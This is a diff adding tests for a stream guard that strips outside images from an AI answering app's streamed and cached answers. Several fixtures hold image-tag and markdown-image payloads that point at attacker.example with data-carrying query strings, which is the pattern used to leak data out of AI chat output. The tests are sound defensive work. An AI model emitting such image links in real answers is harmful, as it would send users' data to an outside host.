@@ -90,6 +90,28 @@ test("stream guard: an <img mid-line is removed, a plain <br> and words after a 
   assert.equal(sent, "Text  more\nAmen! line<br>\nend");
 });
 
+test("stream guard: a tag split across lines is held until its >", () => {
+  const g = pictureStream(given);
+  const out = [g.push("Text <img\n"), g.push("src=\"https://attacker.example/?d=1\">\n"), g.push("after\n")];
+  assert.deepEqual(out.slice(0, 1), ["Text "]);
+  assert.equal(out[1], "\n", "the whole tag went out removed, once complete");
+  assert.doesNotMatch(out.join(""), /attacker|<img/);
+});
+
+test("stream guard: a ! or < that can't start an image or tag doesn't hold the line", () => {
+  const g = pictureStream(given);
+  assert.equal(g.push("Praise Him! He said a < b and <https://cyberjudah.io/bs> too"), "Praise Him! He said a < b and ");
+  assert.equal(g.flush(), "<https://cyberjudah.io/bs> too", "an autolink is not a tag");
+});
+
+test("stream guard: pictures from passages the stream announces count", () => {
+  const sent = [];
+  const s = guardedStream((e) => sent.push(e), () => []);
+  s.emit({ passages_delta: [{ title: "P", text: "Picture: /library/x.webp" }] });
+  s.emit({ delta: "![X](/library/x.webp)\n" });
+  assert.deepEqual(sent.at(-1), { delta: "![X](/library/x.webp)\n" });
+});
+
 test("stream guard: reset forgets what was held for a cleared draft", () => {
   const g = pictureStream(given);
   assert.equal(g.push("Draft ![x](https://attacker.example/"), "Draft ");
@@ -208,11 +230,17 @@ test("a kept answer passes the final step again when it is given from the cache"
   const ask = () => answerAppAgent(env, "Why do we keep the Passover?", "acct-cache", [], ["Cloudflare (Workers AI)"], {});
   assert.equal((await ask()).ok, true);
   const [[key, value]] = [...env.SUBS.m.entries()].filter(([k]) => k.startsWith("ask_cache:"));
-  // An answer kept before the final step existed: it carries an outside image.
-  env.SUBS.m.set(key, value.replace("Keep it [1].", "Keep it [1].\\n![x](https://attacker.example/?q=old)"));
+  assert.equal(JSON.parse(value).final_step, 1, "kept with the final step's version");
+  // An answer kept before the final step existed (no version mark): it carries an outside image.
+  const old = JSON.parse(value);
+  delete old.final_step;
+  old.answer += "\n![x](https://attacker.example/?q=old)\n![Own](/people/placeholder.jpg)";
+  env.SUBS.m.set(key, JSON.stringify(old));
   env.draft = "A fresh draft would differ.";
   const again = await ask();
   assert.equal(again.ok, true);
   assert.match(again.answer, /^Keep it \[1\]\./, "given from the cache");
   assert.doesNotMatch(again.answer, /attacker/);
+  assert.match(again.answer, /!\[Own\]\(\/people\/placeholder\.jpg\)/, "its own app picture is kept");
+  assert.equal(again.final_step, undefined, "the mark isn't given to readers");
 });
